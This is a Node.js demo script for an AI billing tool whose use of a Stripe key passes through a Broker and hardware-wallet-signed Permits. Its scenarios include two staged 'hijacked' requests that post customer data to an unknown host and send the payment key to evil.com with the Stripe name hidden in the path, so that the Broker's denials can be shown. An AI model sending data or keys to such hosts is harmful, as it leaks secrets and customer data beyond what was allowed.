#!/usr/bin/env node
// The AI tool in the demo, as its own process: "billing-assistant".
// It makes requests through the Broker with a key it never holds. It cannot sign a Permit:
// only the person can, on the Ledger. The console page (web/gate.html) does not drive it;
// the page only shows what this process reports on GET /events.
//
//   node demo-agent.mjs [broker] [bridge] [deaf-broker]
//   defaults: http://127.0.0.1:8787  http://127.0.0.1:8791  (none)
//   listens on 127.0.0.1:8792 (PORT_AGENT to change)
//   in a terminal:  1 routine · 2 heavy · 3 hijacked · 4 disguised · 5 0G unreachable · r reset · q quit
//
// With bridge/bridge.py running and Tomoshibi open on the device, Permits are signed on the
// Ledger. Without a device a software key stands in, and every event says so (`device: false`).
import { createServer, request as httpRequest } from 'node:http'
import { request as httpsRequest } from 'node:https'
import { privateKeyToAccount } from 'viem/accounts'
import { keccak256, toHex, getAddress } from 'viem'
import { DOMAIN, TYPES, normalize, lines, requestHash } from './src/permit.js'
import { skillMessage, skillIdFrom } from './src/skill.js'
import { APIS } from './src/apis.js'

const BROKER = (process.argv[2] ?? 'http://127.0.0.1:8787').replace(/\/$/, '')
const BRIDGE = (process.argv[3] ?? 'http://127.0.0.1:8791').replace(/\/$/, '')
const DEAF = process.argv[4] ? process.argv[4].replace(/\/$/, '') : null   // a Broker that cannot reach 0G
const PORT = Number(process.env.PORT_AGENT ?? 8792)
// On a person's own computer this listens on localhost only. A hosted copy sets HOST_AGENT=0.0.0.0 (tools/hosted-start.sh).
const HOST = process.env.HOST_AGENT ?? '127.0.0.1'

const TOOL = { name: 'billing-assistant', version: '1.0.0' }
const skill = privateKeyToAccount('0x' + '33'.repeat(32))        // the tool's own key (a demo key)
const softHolder = privateKeyToAccount('0x' + '11'.repeat(32))   // stand-in when no Ledger is plugged in
const KEY_LABEL = 'stripe-live'
const KEY = keccak256(toHex(KEY_LABEL))
// One loan covers both a quiet read and a heavy charge (decision 13): the real 0G judges by whether
// money moves, not by the amount, so a $12 charge would wake the Ledger just like a $4,800 one.
const RANGE = { target: 'api.stripe.com', scope: '* /v1' }
const STANDING_USES = 20
const STANDING_DAYS = 7
const now = () => Math.floor(Date.now() / 1000)

// What the tool tries. `what` is the request in a person's words.
// What the tool tries, as one story: a shop owner's payment-reminder tool.
// `what` is the request in a person's words.
const REQUESTS = {
  // Every morning it looks up who has not paid yet. Reading only.
  usual: { what: 'Read the unpaid invoices', method: 'GET', url: 'https://api.stripe.com/v1/invoices?status=open&limit=50' },
  // A customer sent a bag back and the owner asked for the refund. Money leaves her account, so this
  // needs her hand even though she asked for it. The real 0G reads a refund as `decisive` most of the
  // time and `significant` about one time in three, so the demo runs with ZG_ESCALATE=significant:
  // anything where money moves asks for a press (tools/demo-up.sh sets it).
  heavy: { what: 'Refund ₹4,800 for order #1042 (a returned bag)', method: 'POST', url: 'https://api.stripe.com/v1/refunds',
    body: JSON.stringify({ charge: 'ch_order_1042', amount: 480000, currency: 'inr', reason: 'requested_by_customer' }) },
  // A wrong decision at three in the morning: the tool tries to send data somewhere nobody allowed.
  // `.example` is a reserved name: nothing can be reached there, and the Broker refuses before anything leaves.
  'denied-host': { what: 'Send customer data to files.unknown-host.example', hijacked: true, method: 'POST', url: 'https://files.unknown-host.example/upload' },
  'denied-sneak': { what: 'Use your payment key at evil.com, with the right name hidden in the path', hijacked: true, method: 'POST', url: 'https://evil.com/api.stripe.com/v1/charges' },
}
REQUESTS.stopped = { ...REQUESTS.heavy, what: 'Refund ₹4,800 for order #1042 — while 0G cannot be reached' }
const KEYS = { 1: 'usual', 2: 'heavy', 3: 'denied-host', 4: 'denied-sneak', 5: 'stopped' }

// ── what happened, in order. The page reads this. ──
const events = []
let epoch = Date.now()
const emit = (e) => { events.push({ n: events.length, at: new Date().toISOString(), ...e }); log(e) }
function log(e) {
  const d = e.response?.decision
  const line = e.type === 'request' ? `→ ${e.what}`
    : e.type === 'verdict' ? `  ${d}${e.response.reason ? ' ' + e.response.reason : ''}${e.response.zg?.tier ? '  0G: ' + e.response.zg.tier : ''}  ${e.ms}ms`
    : e.type === 'asking' ? `  … waiting for a hold on ${e.device ? 'the Ledger' : 'the page (no Ledger)'}  (${e.uses} use${e.uses === 1 ? '' : 's'})`
    : e.type === 'signed' ? `  signed by ${e.holder}${e.device ? '' : '  [software key]'}`
    : e.type === 'declined' ? `  not signed: ${e.error}` : e.type === 'error' ? `  ! ${e.error}`
    : e.type === 'light' ? `  light: ${e.decision}${e.reason ? ' ' + e.reason : ''}` : null
  if (line) console.log(line)
}

const post = async (base, path, body, ms = 250000) => {
  const r = await fetch(base + path, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body), signal: AbortSignal.timeout(ms) })
  return { status: r.status, body: await r.json() }
}
/** Like post(), for an answer that may take many minutes. fetch gives up after five (its wait for the first
 *  byte of an answer), and a person confirming in World App can take longer than that. */
const postLong = (base, path, body, ms) => new Promise((resolve, reject) => {
  const u = new URL(base + path), data = JSON.stringify(body)
  const req = (u.protocol === 'https:' ? httpsRequest : httpRequest)(u, { method: 'POST', headers: { 'content-type': 'application/json', 'content-length': Buffer.byteLength(data) } }, (res) => {
    let raw = ''
    res.setEncoding('utf8'); res.on('data', (c) => { raw += c })
    res.on('end', () => { try { resolve({ status: res.statusCode, body: JSON.parse(raw) }) } catch (e) { reject(e) } })
  })
  req.setTimeout(ms, () => req.destroy(new Error('no answer in time')))
  req.on('error', reject)
  req.end(data)
})
const probe = async () => {
  if (BRIDGE === 'none') return false   // a hosted copy has no USB: the Ledger is reached through the page, or not at all
  try { return (await (await fetch(BRIDGE + '/health', { signal: AbortSignal.timeout(4000) })).json()).ready === true } catch { return false }
}
// Right after a hold the device is busy showing its own screen and does not answer for a few
// seconds. A Ledger that signed a moment ago is still there: wait for it rather than fall back.
let deviceSeen = 0
// The Ledger can be reached two ways. Either the page itself is connected to it (Bluetooth or USB
// from the browser, e.g. on a phone) and carries the bytes for us, or a bridge next to this process is.
// Returns 'page', 'bridge' or false.
let pageDevice = { at: 0, how: null }
// With a bridge on this computer the USB link is the bridge's alone: a page that also opened the device would talk
// over it. The page carries the bytes only for a copy that has no USB of its own (BRIDGE === 'none').
const pageReady = () => BRIDGE === 'none' && Date.now() - pageDevice.at < 9000
const deviceReady = async (waitMs = 0) => {
  const until = Date.now() + waitMs
  for (;;) {
    if (pageReady()) { deviceSeen = Date.now(); return 'page' }
    if (await probe()) { deviceSeen = Date.now(); return 'bridge' }
    if (Date.now() >= until) return false
    await new Promise((r) => setTimeout(r, 2000))
  }
}

// ── when the page carries the bytes: the same APDUs the bridge sends (spec/permit-signature.md) ──
const PATH = [44 | 0x80000000, 60 | 0x80000000, 0x80000000, 0, 0]   // m/44'/60'/0'/0/0
const hx = (bytes) => Buffer.from(bytes).toString('hex')
function permitApdus(fields) {
  const path = Buffer.concat([Buffer.from([PATH.length]), ...PATH.map((c) => { const b = Buffer.alloc(4); b.writeUInt32BE(c >>> 0); return b })])
  const body = Buffer.from(JSON.stringify({ skill: fields.skill.replace(/^0x/, '').toLowerCase(), version: String(fields.version), key: KEY_LABEL,
    target: fields.target, scope: fields.scope, maxCalls: Number(fields.maxCalls), expiry: Number(fields.expiry), nonce: Number(fields.nonce) }))
  if (body.length > 510) throw new Error('the permit is too long for the device')
  const out = [hx(Buffer.concat([Buffer.from([0xe0, 0x06, 0x00, 0x80, path.length]), path]))]
  for (let i = 0, n = 1; i < body.length; i += 250, n++) {
    const chunk = body.subarray(i, i + 250), last = i + 250 >= body.length
    out.push(hx(Buffer.concat([Buffer.from([0xe0, 0x06, n, last ? 0x00 : 0x80, chunk.length]), chunk])))
  }
  return out
}
const N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n
/** The device's answer (siglen, DER signature, parity, 20-byte holder, 9000) -> { signature, holder }. */
function readSignature(answerHex) {
  const r = Buffer.from(answerHex, 'hex'), sw = answerHex.slice(-4)
  if (sw === '6985') return { error: 'declined on the device' }
  if (sw === '5515') return { error: 'the Ledger is locked' }
  if (sw !== '9000' || r.length < 30) return { error: `the device answered ${sw}` }
  const siglen = r[0], der = r.subarray(1, 1 + siglen)
  let parity = r[1 + siglen]
  const holder = r.subarray(2 + siglen, 22 + siglen)
  const rl = der[3], rr = BigInt('0x' + hx(der.subarray(4, 4 + rl))), sl = der[5 + rl]
  let ss = BigInt('0x' + hx(der.subarray(6 + rl, 6 + rl + sl)))
  if (ss > N / 2n) { ss = N - ss; parity ^= 1 }   // Ethereum wants the low s; flipping s flips the parity
  const h32 = (v) => v.toString(16).padStart(64, '0')
  return { signature: '0x' + h32(rr) + h32(ss) + (27 + parity).toString(16), holder: getAddress('0x' + hx(holder)) }
}
let pageWait = null   // { askId, resolve } while the page is carrying a request to the Ledger
// A hosted copy can be reached by anyone, and every judgement spends a little of the 0G balance. So it paces itself:
// so many requests in ten minutes and in a day, then it says it is resting. On a person's own computer there is no limit.
const HOSTED = HOST !== '127.0.0.1'
const paced = { run: [], world: [] }
function rested(kind, per10min, perDay) {
  if (!HOSTED) return true
  const t = Date.now(), l = paced[kind] = paced[kind].filter((x) => t - x < 86400000)
  if (l.filter((x) => t - x < 600000).length >= per10min || l.length >= perDay) return false
  l.push(t); return true
}
const vouches = new Map()   // World device code -> the outcome (a promise), so a second ask gets the same answer

// Look for the device in the background, so /health never waits on a USB exchange.
// Not while a request is in flight, and not in the seconds after a hold, when the device is drawing.
let quietUntil = 0
const watch = async () => { if (!busy && Date.now() > quietUntil) await deviceReady(); setTimeout(watch, 3000) }
setTimeout(watch, 0)

let standing = null    // { permit, signature, device }
let busy = false
let softWait = null    // resolve(true|false) while the page's own button stands in for the Ledger

/** Ask the person for a Permit. On the Ledger if there is one. Resolves when they hold or decline. */
async function ask(uses, why, rid, days) {
  // A key that was lent on the Ledger is never continued with a software key. If the device
  // has gone quiet, wait for it; if it does not come back, the answer is no.
  const mustBeDevice = Boolean(standing?.device) && why !== 'lend'
  let device = await deviceReady(Date.now() - deviceSeen < 600000 ? 8000 : 0)
  if (!device && mustBeDevice) {
    emit({ type: 'waiting-device', rid, why })
    device = await deviceReady(90000)
    if (!device) { emit({ type: 'declined', rid, why, error: 'the Ledger did not answer' }); return { error: 'the Ledger did not answer' } }
  }
  const fields = { skill: skillIdFrom(skill.address), version: TOOL.version, ...RANGE, maxCalls: uses, expiry: now() + (why === 'lend' ? Math.round((days || STANDING_DAYS) * 86400) : 3600), nonce: Date.now() }
  // The four lines shown on the page come from lines(), the same function the Broker uses on the
  // signed Permit. The page never writes its own version of the range.
  const shown = lines({ holder: softHolder.address, key: KEY, ...fields })
  const askId = `a${Date.now()}`
  emit({ type: 'asking', rid, why, uses, device: Boolean(device), via: device || null, askId, apdus: device === 'page' ? permitApdus(fields) : undefined, keyLabel: KEY_LABEL, lines: shown })
  let out
  if (device === 'page') {
    // The page already has the APDUs (they went out with the `asking` event). Wait for what the device said.
    const answer = await new Promise((resolve) => { pageWait = { askId, resolve }; setTimeout(() => resolve({ error: 'nobody answered on the device' }), 240000) })
    pageWait = null
    const sig = answer.error ? answer : readSignature(answer.hex)
    out = sig.error ? { error: sig.error } : { permit: { holder: sig.holder, key: KEY, ...fields }, signature: sig.signature, device: true, via: 'page' }
  } else if (device) {
    const r = await post(BRIDGE, '/permit', { ...fields, keyLabel: KEY_LABEL }).catch((e) => ({ status: 502, body: { error: String(e.message ?? e) } }))
    out = r.status === 200 ? { permit: r.body.permit, signature: r.body.signature, device: true, via: 'bridge' } : { error: r.status === 403 ? 'declined on the device' : (r.body.error ?? 'the Ledger did not sign') }
  } else {
    const ok = await new Promise((resolve) => { softWait = resolve; setTimeout(() => resolve(false), 240000) })
    softWait = null
    if (ok) {
      const permit = { holder: softHolder.address, key: KEY, ...fields }
      out = { permit, device: false, signature: await softHolder.signTypedData({ domain: DOMAIN, types: TYPES, primaryType: 'Permit', message: normalize(permit) }) }
    } else out = { error: 'declined' }
  }
  if (out.error) emit({ type: 'declined', rid, why, error: out.error })
  else { quietUntil = Date.now() + 6000; if (out.device) deviceSeen = Date.now() + 6000
    emit({ type: 'signed', rid, why, uses, device: out.device, via: out.via || null, holder: out.permit.holder, lines: lines(out.permit) }) }
  return out
}

/** The tool asks the Broker to use the key. */
async function use(signed, id, rid, pressed, q = REQUESTS[id]) {
  const { what, hijacked, ...req } = q
  const request = { keyRef: signed.permit.key, ...req }
  const skillSignature = await skill.signMessage({ message: skillMessage(requestHash(signed.permit, request)) })
  const t0 = Date.now()
  const broker = id === 'stopped' && DEAF ? DEAF : BROKER
  const r = await post(broker, '/use', { permit: signed.permit, signature: signed.signature, request, skillSignature }, 60000)
  // The page gets the Broker's answer without the service's own data: only a one-line summary of what came back.
  const { result, ...answer } = r.body ?? {}
  emit({ type: 'verdict', rid, pressed: Boolean(pressed), ms: Date.now() - t0, response: answer, service: summary(r.body), device: signed.device })
  if (r.body?.decision === 'ALLOWED' && r.body.live && /\/v1\/refunds$/.test(req.url) && result?.status === 200) refunded = parkedRow?.seed?.payment_intent ?? null
  sealLater(broker, rid, r.body?.thread)
  return r.body
}

// ── Stripe, when a test-mode key is parked in the Broker (the tool never sees that key) ──
// The Broker says which labels have a key and what test data exists for them: every column except the key.
let parkedRow = null, parkedAt = 0, refunded = null
async function parkedNow(maxAge = 3000) {
  if (Date.now() - parkedAt < maxAge) return parkedRow
  parkedAt = Date.now()
  try { parkedRow = (await (await fetch(BROKER + '/keys', { signal: AbortSignal.timeout(3000) })).json()).keys?.find((k) => k.label === KEY_LABEL) ?? null } catch { parkedRow = null }
  return parkedRow
}
const moneyText = (amount, currency) => (currency === 'inr' ? '₹' : currency === 'usd' ? '$' : '') + (amount / 100).toLocaleString('en-IN', { maximumFractionDigits: 2 }) + (['inr', 'usd'].includes(currency) ? '' : ' ' + String(currency).toUpperCase())
/** What the tool is about to ask for. With a parked key the refund names a real test payment; without one it is the stand-in request. */
async function requestFor(id) {
  const q = REQUESTS[id]
  if (!['heavy', 'stopped'].includes(id)) return q
  let row = await parkedNow(0)
  if (!row) return q
  // After a refund went through there is nothing left to refund: ask the Broker for a fresh test payment.
  if (row.seed?.payment_intent && row.seed.payment_intent === refunded) { await post(BROKER, '/keys/reseed', { label: KEY_LABEL }, 60000).catch(() => {}); row = await parkedNow(0) }
  const pi = row?.seed?.payment_intent
  if (!pi) return q
  return { ...q, what: q.what.replace('₹4,800', moneyText(row.seed.amount, row.seed.currency)), headers: { 'content-type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ payment_intent: pi, reason: 'requested_by_customer' }).toString() }
}
/** One line about what the service answered. The answer itself stays out of the events. */
function summary(body) {
  if (!body || body.decision !== 'ALLOWED' || !body.result) return null
  if (!body.live) return { live: false, status: body.result.status, text: 'stand-in answer' }
  let j = null; try { j = JSON.parse(body.result.body) } catch {}
  const text = j?.error ? String(j.error.message ?? j.error.type) : j?.object === 'list' ? `${j.data.length}${j.has_more ? '+' : ''} unpaid invoice${j.data.length === 1 ? '' : 's'}` : j?.object === 'refund' ? `refund ${j.id} · ${j.status}` : j?.object ?? 'answered'
  return { live: body.live, status: body.result.status, text: String(text).slice(0, 140) }
}

// Every answer is final, so the thread can go into 0G Storage as soon as it exists. The Broker does the storing
// (it holds the wallet key); the tool only asks, one at a time, and reports what really happened. A Broker without
// a wallet key is not asked at all (the hosted copy): nothing is claimed that did not happen.
let canSeal = null, sealing = Promise.resolve()
function sealLater(broker, rid, thread) {
  if (!thread || canSeal === false || process.env.SEAL === '0') return
  sealing = sealing.then(() => post(broker, '/seal', { thread }, 180000))
    .then((r) => emit({ type: 'sealed', rid, thread, uploaded: Boolean(r.body?.uploaded), url: r.body?.url ?? null, rootHash: r.body?.rootHash ?? null, reason: r.body?.reason ?? null }))
    .catch((e) => emit({ type: 'sealed', rid, thread, uploaded: false, url: null, rootHash: null, reason: String(e.message ?? e) }))
}

// The page may pick how many uses and for how many days (within sane bounds). Everything else is fixed.
async function lend({ uses, days } = {}) {
  if (busy) return { ok: false, error: 'busy' }
  busy = true
  const u = Math.min(100, Math.max(1, Math.round(Number(uses) || STANDING_USES))), d = Math.min(30, Math.max(1, Number(days) || STANDING_DAYS))
  try { const p = await ask(u, 'lend', undefined, d); if (!p.error) standing = p; return { ok: !p.error } } finally { busy = false }
}

async function run(id) {
  if (!REQUESTS[id]) return { ok: false, error: 'unknown request' }
  if (busy) return { ok: false, error: 'busy' }
  if (!standing) { emit({ type: 'error', error: 'No permit has been signed yet.' }); return { ok: false, error: 'not lent' } }
  if (id === 'stopped' && !DEAF) { emit({ type: 'error', error: 'No Broker without 0G was started (third argument), so this cannot be shown live.' }); return { ok: false, error: 'no deaf broker' } }
  busy = true
  try {
    const rid = `${epoch}-${events.length}`
    const q = await requestFor(id)
    emit({ type: 'request', rid, id, tool: TOOL.name, hijacked: Boolean(q.hijacked), what: q.what, method: q.method, url: q.url, body: q.body })
    const b = await use(standing, id, rid, false, q)
    if (b.decision === 'DENIED' && standing.via === 'page') {
      // The page is the one connected to the Ledger: hand it the notice to pass on.
      const text = Buffer.from(`A tool tried to use ${KEY_LABEL} at ${new URL(q.url).hostname}`)
      emit({ type: 'notice', rid, via: 'page', apdu: hx(Buffer.concat([Buffer.from([0xe0, 0x07, 0x01, 0x00, text.length]), text])) })
    } else if (b.decision === 'DENIED' && standing.device) {
      // Put the refusal in the person's hand. Not awaited: nobody should have to tap for the story to go on.
      post(BRIDGE, '/notice', { kind: 'blocked', text: `A tool tried to send ${KEY_LABEL} to ${new URL(q.url).hostname}` }, 8000)
        .then((r) => emit({ type: 'device', rid, showed: 'BLOCKED', ok: r.status === 200 })).catch(() => {})
    }
    if (b.decision === 'NEEDS_PRESS') {
      // The Broker would not let it through on the standing Permit. Wake the Ledger: one Permit, one use.
      const p = await ask(1, 'press', rid)
      if (!p.error) await use(p, id, rid, true, q)
    }
    return { ok: true }
  } catch (e) { emit({ type: 'error', error: String(e.message ?? e) }); return { ok: false } } finally { busy = false }
}

function reset() { post(BROKER, '/keys/forget', {}, 5000).catch(() => {}); parkedRow = null; parkedAt = 0; refunded = null; standing = null; events.length = 0; epoch = Date.now(); if (softWait) softWait(false); if (pageWait) pageWait.resolve({ error: 'reset' }); return { ok: true } }

const routes = {
  'GET /health': async () => {
    let broker = null
    try { broker = await (await fetch(BROKER + '/health', { signal: AbortSignal.timeout(1500) })).json() } catch {}
    if (broker) canSeal = Boolean(broker.zg?.storageKey) && !HOSTED
    const row = broker ? await parkedNow() : null
    return { ok: true, broker: BROKER, brokerUp: Boolean(broker), simulated: Boolean(broker?.zg?.simulated), execute: Boolean(broker?.execute), worldSimulated: Boolean(broker?.world?.simulated),
      model: broker?.zg?.model, device: pageReady() || Date.now() - deviceSeen < (busy ? 600000 : 20000), via: pageReady() ? 'page' : null, lent: Boolean(standing), deaf: Boolean(DEAF),
      tool: TOOL, range: { key: KEY_LABEL, ...RANGE, uses: STANDING_USES, days: STANDING_DAYS }, skill: skillIdFrom(skill.address), version: TOOL.version,
      apis: APIS, storage: Boolean(canSeal),
      // Is the call to Stripe real? 'test' = a test-mode key is parked in the Broker; null = the stand-in answers.
      stripe: row?.mode ?? (broker?.execute ? 'real' : null), seed: row?.seed ? { payment: Boolean(row.seed.payment_intent), invoices: row.seed.invoices, notes: row.seed.notes } : null, canPark: !HOSTED }
  },
  'GET /events': async (_, url) => { const since = Number(url.searchParams.get('since') ?? 0); return { epoch, events: events.slice(since), busy } },
  'POST /lend': async (body) => { lend(body); return { ok: true } },          // answers at once; the outcome arrives as events
  'POST /run': async ({ id }) => { if (!rested('run', 40, 800)) { emit({ type: 'error', error: 'This shared demo is resting: too many requests in a short time. Try again in a few minutes.' }); return { ok: false, error: 'resting' } } run(id); return { ok: true } },
  'POST /hold': async ({ ok = true }) => { if (softWait) softWait(Boolean(ok)); return { ok: Boolean(softWait) } },
  // Lighting a light is for the person who lent the key. The page starts World itself, but the
  // last step goes through here so the Permit signed on the Ledger travels with it. The page
  // never sees the signature.
  // World can take minutes, and the phone that asked is often asleep or in another app by the time it answers.
  // So the outcome is kept: asking again with the same code gets the same answer, and it also goes out as an
  // event, which the page reads the next time it looks.
  'POST /vouch/finish': async ({ deviceCode }) => {
    if (!standing) return { decision: 'VOUCH_DENIED', reason: 'NOT_LENT', message: 'No permit has been signed on this computer.' }
    if (!vouches.has(deviceCode)) {
      const s = standing
      vouches.set(deviceCode, (async () => {
        const r = await postLong(BROKER, '/vouch/finish', { deviceCode, skill: skillIdFrom(skill.address), version: TOOL.version, permit: s.permit, signature: s.signature }, 660000)
          .catch((e) => ({ body: { decision: 'VOUCH_DENIED', reason: 'WORLD_ERROR', message: String(e.message ?? e) } }))
        const out = { ...r.body, ownerProof: { sent: true, device: s.device, holder: s.permit.holder } }
        emit({ type: 'light', decision: out.decision, reason: out.reason ?? null, message: out.message ?? null, nullifier: out.nullifier ?? null, ownerChecked: Boolean(out.ownerChecked), simulated: Boolean(out.world?.simulated) })
        return out
      })())
    }
    return vouches.get(deviceCode)
  },
  // The page says: I am connected to a Ledger with Tomoshibi open (sent every few seconds while true).
  'POST /device': async ({ ready, how }) => { pageDevice = ready ? { at: Date.now(), how: how || null } : { at: 0, how: null }; return { ok: true } },
  // What the page saw while talking to the Ledger (for finding out why a connection does not work).
  'POST /device/log': async ({ msg }) => { console.log(`  [page] ${String(msg).slice(0, 300)}`); return { ok: true } },
  // The page hands back what the Ledger answered to the APDUs of one `asking` event.
  'POST /device/answer': async ({ askId, hex, error }) => {
    if (!pageWait || pageWait.askId !== askId) return { ok: false, error: 'nothing is waiting for that' }
    pageWait.resolve(error ? { error } : { hex: String(hex || '') }); return { ok: true }
  },
  'POST /reset': async () => reset(),
}

createServer(async (req, res) => {
  const send = (code, obj) => { res.writeHead(code, { 'content-type': 'application/json', 'access-control-allow-origin': '*', 'access-control-allow-headers': 'content-type' }); res.end(JSON.stringify(obj)) }
  if (req.method === 'OPTIONS') return send(204, {})
  const url = new URL(req.url, 'http://x')
  // /b/… is passed straight on to the Broker. A phone then needs one public address (this process)
  // to reach both the tool and the record. Nothing is added or changed on the way.
  if (url.pathname.startsWith('/b/')) {
    if (req.method === 'POST' && url.pathname === '/b/vouch/start' && !rested('world', 20, 300)) return send(429, { ok: false, error: 'This shared demo is resting. Try again in a few minutes.' })
    // A hosted copy passes on only what the pages need. It holds no wallet key, and nobody outside can ask it to write.
    if (HOSTED && req.method === 'POST' && !['/b/vouch/start', '/b/vouch/finish'].includes(url.pathname)) return send(403, { ok: false, error: 'not available on the hosted copy' })
    let raw = ''
    for await (const c of req) raw += c
    try {
      const r = await fetch(BROKER + url.pathname.slice(2) + url.search, { method: req.method, body: req.method === 'GET' ? undefined : raw, signal: AbortSignal.timeout(660000) })
      res.writeHead(r.status, { 'content-type': 'application/json', 'access-control-allow-origin': '*', 'access-control-allow-headers': 'content-type' })
      return res.end(await r.text())
    } catch (e) { return send(502, { error: `Broker not reachable: ${String(e.message ?? e)}` }) }
  }
  const route = routes[`${req.method} ${url.pathname}`]
  if (!route) return send(404, { error: 'not found' })
  let raw = ''
  for await (const c of req) raw += c
  try { send(200, await route(raw ? JSON.parse(raw) : {}, url)) } catch (e) { send(502, { ok: false, error: String(e.message ?? e) }) }
}).listen(PORT, HOST, () => {
  console.log(`${TOOL.name} (demo agent) on http://${HOST}:${PORT}\n  broker ${BROKER} · bridge ${BRIDGE} · deaf ${DEAF ?? '—'}`)
  if (process.stdin.isTTY) {
    console.log('  keys: 1 routine · 2 heavy · 3 hijacked · 4 disguised · 5 0G unreachable · l lend · r reset · q quit\n')
    process.stdin.setRawMode(true); process.stdin.resume()
    process.stdin.on('data', (k) => {
      const c = String(k)
      if (c === 'q' || c === '\u0003') process.exit(0)
      if (c === 'l') lend(); else if (c === 'r') { reset(); console.log('— reset —') } else if (KEYS[c]) run(KEYS[c])
    })
  }
})
